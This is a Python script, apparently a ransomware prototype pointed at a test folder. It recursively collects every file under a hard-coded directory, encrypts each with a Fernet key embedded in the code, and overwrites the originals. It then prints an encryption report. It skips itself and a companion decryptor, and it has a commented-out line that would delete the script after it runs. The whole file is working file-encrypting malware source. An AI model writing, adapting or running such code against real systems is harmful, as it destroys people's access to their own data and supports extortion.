import os
from cryptography.fernet import Fernet
import sys

target_dir=r"C:\Users\Arthu\Documents\python\face\other\packets\target_3"
def parse(directory_to_parse):
    global files_found, target_dir
    for file_name in os.listdir(directory_to_parse):
        path = os.path.join(directory_to_parse, file_name)
        if file_name == str(sys.argv[0]) or file_name == "decryptor v2.2.py":
            continue
        print(f"before isfile: file name {file_name}")
        if os.path.isfile(path):
            files.append(path)
            print('-' * 80)
            print(f"[{file_name}]--file found")
            files_found+=1
        else:
            print(f"test- found directory {path}")
            print(f"folder NAME:{file_name}")
            found_folder=f"{target_dir}" + "/" + f"{file_name}"
            parse(found_folder)
            

sys.setrecursionlimit(10000)
print(os.getcwd())
chdir=target_dir
os.chdir(target_dir)
files=[]
files_found = 0
files_read = 0
files_encrypted = 0
errors = 0

# for file in os.listdir():
#     if file == "encryptor_GENERATED.py" or file == "decryptor_GENERATED.py" or file == "decrypter_debug.py":
#         continue
#     if os.path.isfile(file):
#         files.append(file)
#         print('-' * 80)
#         print(f"[{file}]--file found")
#         files_found+=1




# parse(r"'''+str(direct)+'''")
parse(target_dir)

for file in files:
    with open(file, "rb") as thefile:
        try:
            contents = thefile.read()
            print('-' * 80)
            print(f"[{thefile}]--reading")
            files_read+=1
        except:
            print('-' * 80)
            print(f"[{thefile}]--error reading")
            errors+=1

        try:
            contents_encrypted = Fernet('wlVASGfwMrf7tmufVi_WXPe9ODIfwCKacx7uQnQcGpc=').encrypt(contents)
            print('-' * 80)
            print(f"[{thefile}]--encrypting")
            files_encrypted+=1
        except Exception as e:
            errors+=1
            print('-' * 80)
            print(f"[{thefile}]--error reading")
            print(e)

    with open(file, "wb") as thefile:
        try:
            thefile.write(contents_encrypted)
        except Exception as e:
            print('-' * 80)
            print(f"[{thefile}]--error writing to file")
            errors+=1
            print(e)

print('-' * 80)
print('-' * 80)
print("Process Completed")
print('-' * 40)
print("Process Report")
print(f"Files Found...............{files_found}")
print(f"Files Read................{files_read}")
print(f"Files Encrypted...........{files_encrypted}")
print(f"Errors Encountered........{errors}")
        # os.remove(str(sys.argv[0]))